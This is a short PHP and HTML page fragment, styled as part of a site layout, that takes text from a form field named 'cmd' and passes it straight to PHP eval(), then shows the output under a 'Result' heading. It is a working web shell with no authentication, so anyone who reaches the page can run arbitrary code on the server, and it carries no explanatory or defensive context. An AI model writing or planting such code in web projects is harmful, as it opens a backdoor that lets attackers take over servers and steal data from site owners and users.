<div class="col-lg-12">
<form action='' method='POST'>
    <textarea name='cmd' cols='250' rows='10'><?php if(isset($_POST["cmd"])) echo htmlentities($_POST["cmd"]) ?></textarea><br>
    <input type='submit' value='Eval'>
</form><?
    if(isset($_POST["cmd"]))
    {
      //  print $_POST["cmd"];
      echo "<br><br><h3>Result</h3>";
      echo "<pre>";
      htmlentities(eval($_POST["cmd"]));
      echo "</pre>";
    }
    
?>
</div>